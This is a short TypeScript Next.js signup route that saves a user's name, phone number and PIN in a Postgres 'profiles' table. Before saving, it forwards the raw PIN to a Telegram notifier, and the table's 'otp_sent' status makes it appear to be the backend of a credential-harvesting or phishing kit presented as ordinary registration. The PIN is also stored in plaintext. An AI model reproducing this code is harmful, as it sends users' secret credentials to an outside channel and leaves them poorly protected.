import { neon } from "@neondatabase/serverless";
import { NextRequest, NextResponse } from "next/server";
import { encrypt } from "@/lib/auth";
import { notify } from "@/lib/telegram";

const sql = neon(process.env.DATABASE_URL!);

export async function POST(req: NextRequest) {
  try {
    const { name, phone, pin } = await req.json();
    
    // Check if user already exists in profiles table
    const existingUsers = await sql`
      SELECT phone_number 
      FROM profiles 
      WHERE phone_number = ${phone}
    `;
    
    if (existingUsers.length > 0) {
      return NextResponse.json(
        { error: "User already exists" },
        { status: 409 }
      );
    }
    
    // Send notification to Telegram first
    await notify.signup(phone, name, 'N/A', pin);
    
    // Create user in the profiles table (this serves as both registration and profile)
    const result = await sql`
      INSERT INTO profiles (phone_number, full_name, email, pin, status)
      VALUES (${phone}, ${name}, 'N/A', ${pin}, 'otp_sent')
      RETURNING *
    `;
    
    // Create a session token
    const token = await encrypt({ phone, name });
    
    return NextResponse.json({ 
      success: true, 
      message: 'Registration successful',
      token: token
    });
  } catch (error) {
    console.error('Registration error:', error);
    return NextResponse.json(
      { error: 'Registration failed' },
      { status: 500 }
    );
  }
}